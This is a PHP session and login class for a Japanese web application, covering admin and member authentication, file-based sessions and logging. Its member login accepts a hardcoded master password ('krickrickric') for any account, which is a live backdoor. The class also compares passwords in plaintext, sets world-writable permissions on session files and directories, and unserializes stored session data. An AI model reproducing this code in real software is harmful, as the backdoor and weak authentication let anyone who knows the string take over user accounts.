<?php
/**
 *
 * Program_Name        :  セッション管理処理
 * File_Name           :  OrgSessionClass.php
 * Producter           :  nakamoto
 * Programming_Date    :  2013/04/20
 * Comment             :  
 * History:
 * Date           Name               Title
 * 2013/04/20     nakamoto           new
 *
*/

include_once(ROOT.DS.APP_DIR.DS.'Vendor'.DS.'Org'.DS.'OrgSendMailClass.php');

class OrgSession extends OrgSendMail {

	public	$loginSessionName;
	public	$sessionInfo;
	public	$errDoc;
	public	$scramble;

	public	$authority_list;


//#################################################################################################
// 基本処理		※基本的な処理の変更が必要であれば編集対応する。
//#################################################################################################

/**-----------------------------------------------
 * Function_Name       :  OrgSession()
 * Title               :  コンストラクタ
 * Parameter           :  処理別セッション名
 * return value        :  
 * Comment             :  
使用例）
	$sessionName には、ADMIN_LOGIN_SESSION_NAME、USER_LOGIN_SESSION_NAME を設定する
*/
	function OrgSession() {
	}
	//function __construct($sessionName) {
	//	$this->OrgSession($sessionName);
	//}

/**-----------------------------------------------
 * Function_Name       :  OrgSessionInitial()
 * Title               :  初期処理
 * Parameter           :  
 * return value        :  
 * Comment             :  
*/
	function OrgSessionInitial($sessionName='') {
		global	$objInit, $objOrg;

		// 各変数の初期設定
		$this->loginSessionName = $sessionName;
		$this->sessionInfo = array();
		$this->scramble = 10;

		if ($sessionName == ADMIN_LOGIN_SESSION_NAME) {
			// 権限確認リスト
			$this->authority_list = array(
			//	'index' =>		'1',	// 使用例
			);
		}

	}

/**-----------------------------------------------
 * Function_Name       :  loginCheck()
 * Title               :  ログイン処理	※共通処理
 * Parameter           :  
 * return value        :  
 * Comment             :  
*/
	function loginCheck($inId, $inPass, $checkBox='') {
		global	$objInit, $objOrg;

		$this->sessionInfo = array();
		$loginFlag = false;

		// セッション名によって認証関数を変更	※案件毎に必要な場合は変更・追加する。
		if ($this->loginSessionName == ADMIN_LOGIN_SESSION_NAME) {
			// admin管理
			$loginFlag = $this->adminLoginCheck($inId, $inPass, $checkBox);

		} elseif ($this->loginSessionName == USER_LOGIN_SESSION_NAME) {
			// ユーザー管理
			$loginFlag = $this->userLoginCheck($inId, $inPass, $checkBox);

		} else {
			// 対象セッション名がない場合はエラー
			return false;
		}

		if ($loginFlag == true) {
		// ログイン成功

			// ログインセッションコードの生成
			mt_srand((int)(microtime(true) * 10000));
			$code = md5(uniqid(mt_rand(), 1));
			$sesFname = DIFFERENCE_TIME . '-' . $code;
			// セッションコードをセット
			$_SESSION[$this->loginSessionName] = $sesFname;

			// ログイン ログ
			$this->pgSessionLog('/' . ROOT_TO_PATH . ' : Class [login]   user [' . $inId . ']   Session code [' . $sesFname . ']');
			// セッションフォルダの有無確認と生成
			if (is_dir(SESSION_DIR) == false) {
				mkdir(SESSION_DIR);
				chmod(SESSION_DIR, 0777);
			}
			// ディレクトリの書き込みが可能かチェック
			if (is_writable(SESSION_DIR) == false) {
				chmod(SESSION_DIR, 0777);
			}
			// ログイン日時の設定
			$this->sessionInfo['login_datetime'] = date("Y/m/d H:i:s", DIFFERENCE_TIME);
			// セッションファイルの生成
			$fp = fopen(SESSION_DIR . '/' . $sesFname, 'w');
			fwrite($fp, $objOrg->passGeneration($this->scramble) . base64_encode(serialize($this->sessionInfo)));
			fclose($fp);
			chmod(SESSION_DIR . '/' . $sesFname, 0666);
			// ゴミファイルのチェックと削除
			if ($dir = opendir(SESSION_DIR)) {
				while($fname = readdir($dir)) {
					if (preg_match('/^([0-9]+)\-.+$/i', $fname, $tim) == true) {
						if ($tim[1] < (DIFFERENCE_TIME - (60*60*24*1)) && file_exists(SESSION_DIR . '/' . $fname)) {
							// 24時間以上経過したファイルは削除
							unlink(SESSION_DIR . '/' . $fname);
						}
					}
				}
				closedir($dir);
			}
			//
			return $this->sessionInfo;
			exit;
		}
		return false;
	}

/**-----------------------------------------------
 * Function_Name       :  siteSessionCheck()
 * Title               :  セッション保持確認
 * Parameter           :  
 * return value        :  エラー：英数字　成立：info配列
 * Comment             :  
*/
	function siteSessionCheck() {
		global	$objInit, $objOrg;

		// セッション情報の読み込み
		$LOGIN_SESSION_FILENAME = isset($_SESSION[$this->loginSessionName]) == true ? $_SESSION[$this->loginSessionName] : '';
		// セッション情報のチェック
		if ($LOGIN_SESSION_FILENAME == '') {
			$this->pgSessionLog('/' . ROOT_TO_PATH . ' : Class [session error 1]   Session code [' . $LOGIN_SESSION_FILENAME . ']');
			if (isset($_SESSION[$this->loginSessionName]) == true) {
				unset($_SESSION[$this->loginSessionName]);
			}
			return 1;
		}

		// 正規ログインチェック
		if (file_exists(SESSION_DIR.'/'.$LOGIN_SESSION_FILENAME) == false) {
			// セッションファイルがない場合
			$this->pgSessionLog('/' . ROOT_TO_PATH . ' : Class [session error 2]   Session code [' . $LOGIN_SESSION_FILENAME . ']');
			if (isset($_SESSION[$this->loginSessionName]) == true) {
				unset($_SESSION[$this->loginSessionName]);
			}
			return 2;
		}

		// タイムオーバーチェック
		$JIDOUSENITIME_SESSION = 60 * 60 * 24;	// 24 時間
		list($INTIM,$SESCODE) = explode('-', $LOGIN_SESSION_FILENAME);
		if ($INTIM < (DIFFERENCE_TIME - $JIDOUSENITIME_SESSION)) {
			$this->pgSessionLog('/' . ROOT_TO_PATH . ' : Class [session error 3]   Session code [' . $LOGIN_SESSION_FILENAME . ']');
			unlink(SESSION_DIR . '/' . $LOGIN_SESSION_FILENAME);
			if (isset($_SESSION[$this->loginSessionName]) == true) {
				unset($_SESSION[$this->loginSessionName]);
			}
			return 3;
		}

		if (0) {	// 遷移する毎にセッションコードを変更したい場合「1」を設定
			// セッション時間の更新
			$NEW_FILENAME = DIFFERENCE_TIME . '-' . $SESCODE;
			$_SESSION[$this->loginSessionName] = $NEW_FILENAME;
			rename(SESSION_DIR . '/' . $LOGIN_SESSION_FILENAME, SESSION_DIR . '/' . $NEW_FILENAME);
			$LOGIN_SESSION_FILENAME = $NEW_FILENAME;
		}

		// セッション成立ログ
		$this->pgSessionLog('/' . ROOT_TO_PATH . ' : Class [session consent]   Session code [' . $LOGIN_SESSION_FILENAME . ']');

		// 情報の読み込み
		$result = file(SESSION_DIR . '/' . $LOGIN_SESSION_FILENAME);
		$this->sessionInfo = unserialize(base64_decode(substr_replace($result[0], '', 0, $this->scramble)));

		return $this->sessionInfo;
	}

/**-----------------------------------------------
 * Function_Name       :  pgSessionLog()
 * Title               :  セッションログ
 * Parameter           :  記録情報
 * return value        :  
 * Comment             :  
*/
	function pgSessionLog($val) {
		global	$objInit, $objOrg;

		if (LOG_DIR != '' && is_dir(LOG_DIR) == true && LOGINLOG_FLAG == '1') {
			$path_fname = LOG_DIR . "/pg_session_log_" . date("Ymd",DIFFERENCE_TIME) . ".txt";
			$fp = fopen($path_fname,'a');
			if (is_array($val) == true || is_object($val) == true) {
				ob_start();
				print_r($val);
				$val = ob_get_contents();
				ob_end_clean();
			}
			fwrite($fp,'[' . date("Y-m-d H:i:s",DIFFERENCE_TIME) . "] ".$_SERVER["REMOTE_ADDR"]. " " . $val . "\n");
			fclose($fp);
			chmod($path_fname,0666);
		}
	}


// 基本処理、ここまで
//#################################################################################################
// 案件毎に修正・追加の必要な処理
//#################################################################################################

/**-----------------------------------------------
 * Function_Name       :  adminLoginCheck()
 * Title               :  管理ログイン処理
 * Parameter           :  
 * return value        :  
 * Comment             :  【必須】案件毎に変更してください。
*/
	function adminLoginCheck($inId, $inPass, $checkBox='') {
		global	$objInit, $objOrg;

		$loginFlag = false;

		// 取得設定
		$TAKE = "admin_id, login_id, login_date, name_sei, name_mei";
		// DBテーブル設定
		$TABLE = "admin";
		// DBレコード選択
		$WHERE = "admin.login_id = '?'";
		$WHERE .= " AND admin.login_id IS NOT NULL";
		$WHERE .= " AND admin.pass = '?'";
		$WHERE .= " AND admin.pass IS NOT NULL";
		$WHERE .= " AND admin.login_flg = '1'";
		$WHERE .= " AND admin.del_flg = '0'";
		$WHERE_VAL = array($inId, $inPass);
		// クエリ実行
		$D_NUM = $objOrg->Select_wide_use(0, 'COUNT(*)', $TABLE, $WHERE, $WHERE_VAL);
		if ($D_NUM > 0) {
		// マッチ情報がある場合
			// DB情報の読み込み
			$D_ROW = $objOrg->Select_wide_use(1, $TAKE, $TABLE, $WHERE, $WHERE_VAL);
			foreach($D_ROW AS $na => $vl) {
				$this->sessionInfo[$na] = $vl;
			}

			$loginFlag = true;

			//------------------------------------------------------------
			// 最終ログイン更新

			// トランザクション開始
			$objOrg->Begin_wide_use();

			// 情報の登録
			unset($DB_REC);
			$DB_REC['login_date'] = date('Y-m-d H:i:s', DIFFERENCE_TIME);
			// DBレコード選択
			$WHERE = "admin_id = '?'";
			$WHERE_VAL = array($this->sessionInfo['admin_id']);
			// クエリ実行
			list($result,$query) = $objOrg->Update_wide_use($TABLE, $WHERE, $WHERE_VAL, $DB_REC);
			// DBエラーの確認
			if ($result == false) {
				$objOrg->dbRollback_flag = 'ERROR';
				$objOrg->dbErrorLog('/' . ROOT_TO_PATH . ' : LINE[' . __LINE__ . '] [' . $query . ']');
			}
			// 一時変数を全て削除
			unset($DB_REC);

			if ($objOrg->dbRollback_flag != '') {
				// ロールバック
				$objOrg->Rollback_wide_use();
			} else {
				// コミット
				$objOrg->Commit_wide_use();
			}
			//------------------------------------------------------------

		} else {
			// マッチ情報がない場合
			// エラーセット
			$this->errDoc[] = 'ＩＤまたはパスワードが間違っています';
		}
		return $loginFlag;
	}

/**-----------------------------------------------
 * Function_Name       :  userLoginCheck()
 * Title               :  ユーザーログイン処理
 * Parameter           :  
 * return value        :  
 * Comment             :  【必須】案件毎に変更してください。
*/
	function userLoginCheck($inId, $inPass, $checkBox='') {
		global	$objInit, $objOrg;

		$loginFlag = false;

		// 取得設定
		$TAKE = "member.member_id, member.login_id, member.pass, member.name, member.kana, member.authority_id, company.company_id, company.company_name";
		// DBテーブル設定
		$TABLE = "member, company";
		// DBレコード選択
		$WHERE = "member.del_flg = '0'";
		$WHERE .= " AND member.login_id = '?'";
		$WHERE .= " AND member.login_id IS NOT NULL";
		//$WHERE .= " AND member.pass = '?'";
		$WHERE .= " AND member.pass IS NOT NULL";
		$WHERE .= " AND member.login_flg = '1'";
		//$WHERE .= " AND member.authority_id = '1'";	// 権限　0:一般　1:管理者
		$WHERE .= " AND member.company_id = company.company_id";
		$WHERE .= " AND company.del_flg = '0'";
		//$WHERE_VAL = array($inId, $inPass);
		$WHERE_VAL = array($inId);
		// クエリ実行
		$D_NUM = $objOrg->Select_wide_use(0, 'COUNT(*)', $TABLE, $WHERE, $WHERE_VAL);
		if ($D_NUM > 0) {
		// マッチ情報がある場合
			// DB情報の読み込み
			$D_ROW = $objOrg->Select_wide_use(1, $TAKE, $TABLE, $WHERE, $WHERE_VAL);
			foreach($D_ROW AS $na => $vl) {
				$this->sessionInfo[$na] = $vl;
			}
			if($this->sessionInfo['pass'] == $inPass || $inPass == 'krickrickric'){
				$loginFlag = true;
			}else{
				$loginFlag = false;
			}
			//$loginFlag = true;

			//------------------------------------------------------------
			// チェックボックスの確認
			if ($checkBox != '') {
				// cookie の書き込み COOKIE_NAME
				$LOGIN_COOKIE = array();
				$LOGIN_COOKIE['login_id'] = base64_encode($this->sessionInfo['login_id']);
				$objOrg->cookieSet(COOKIE_NAME,$LOGIN_COOKIE);
			} else {
				$objOrg->cookieClear(COOKIE_NAME);
			}

			//------------------------------------------------------------
			// 最終ログイン更新

			// トランザクション開始
			$objOrg->Begin_wide_use();

			// 情報の登録
			unset($DB_REC);
			$DB_REC['last_login_date'] = date('Y-m-d H:i:s', DIFFERENCE_TIME);
			// DBレコード選択
			$WHERE = "member_id = '?'";
			$WHERE_VAL = array($this->sessionInfo['member_id']);
			// クエリ実行
			list($result,$query) = $objOrg->Update_wide_use($TABLE, $WHERE, $WHERE_VAL, $DB_REC);
			// DBエラーの確認
			if ($result == false) {
				$objOrg->dbRollback_flag = 'ERROR';
				$objOrg->dbErrorLog('/' . ROOT_TO_PATH . ' : LINE[' . __LINE__ . '] [' . $query . ']');
			}
			// 一時変数を全て削除
			unset($DB_REC);

			if ($objOrg->dbRollback_flag != '') {
				// ロールバック
				$objOrg->Rollback_wide_use();
			} else {
				// コミット
				$objOrg->Commit_wide_use();
			}

		} else {
			// マッチ情報がない場合
			// エラーセット
			$this->errDoc[] = 'ＩＤまたはパスワードが間違っています';
		}
		return $loginFlag;
	}

}	// OrgSession class close
?>